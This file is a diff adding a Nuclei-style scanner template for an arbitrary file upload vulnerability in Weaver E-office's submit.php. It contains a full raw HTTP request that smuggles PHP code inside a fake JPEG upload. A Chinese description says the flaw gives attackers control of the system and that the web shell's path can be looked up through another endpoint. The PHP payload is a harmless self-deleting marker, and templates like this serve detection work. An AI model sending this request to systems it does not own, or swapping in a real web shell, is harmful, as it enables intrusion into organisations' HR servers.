@@ -1,0 +1,206 @@
+id: weaver-e-office-submit-upload
+
+info:
+  name: 泛微E-office系统submit.php组件任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    上海泛微网络科技股份有限公司E-office系统submit.php组件存在可被利用的文件上传缺陷，允许攻击者通过特定接口上传恶意文件以获取系统控制权。
+      Web Shell的访问路径需通过接口动态查询获取
+      POST /general/hrms/manage/hrms.php?HR_ID=1 HTTP/1.1
+      Cookie: LOGIN_LANG=cn; PHPSESSID=4305accfef8d87e8907003d2e2b40a55; LOGIN_LANG=cn
+      Connection: close
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    GET /general/hrms/manage/submit.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=6863626f66d8f459eace16cc55e33b30
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="HR_ID"; filename=""
+
+    1
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="ID"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="USER_ID"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="photo"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="ATTACHMENT_PIC_NAME"; filename=""
+
+    C:\\fakepath\\4.jpg
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="ATTACHMENT_ID_OLD"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="ATTACHMENT_NAME_OLD"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="OPERATOR"; filename=""
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="DEPT_ID"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="check_hr_no"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="NO"; filename=""
+
+    1
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="hr_name"; filename=""
+
+    123
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="STATUS"; filename=""
+
+    1
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="sex"; filename=""
+
+    2
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="dept_id"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="BIRTHDAY"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="MARRY"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="EDUCATION"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="ATTACHMENT_path"; filename=""
+
+    C:\\fakepath\\4.php
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="ATTACHMENT_PIC"; filename="4.jpg"
+    Content-Type: image/jpeg
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="WORK_DATE"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="JOIN_DATE"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="LABOR_START_TIME"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="LABOR_END_TIME"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="POST"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="NATION"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="CARD_NO"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="NATIVE_PLACE"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="SPECIALITY"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="SCHOOL"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="CERTIFICATE"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="HOME_ADDR"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="HOME_TEL"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="EMAIL"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="REWARD"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="TRAIN"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="EDU"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="WORK"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="SOCIATY"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="RESUME"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="OTHERS"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="file_elem"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="attachmentIDStr"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30
+    Content-Disposition: form-data; name="attachmentNameStr"; filename=""
+
+
+    --6863626f66d8f459eace16cc55e33b30--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [302]
+  - type: word
+    part: body
+    words:
+    - 'open'
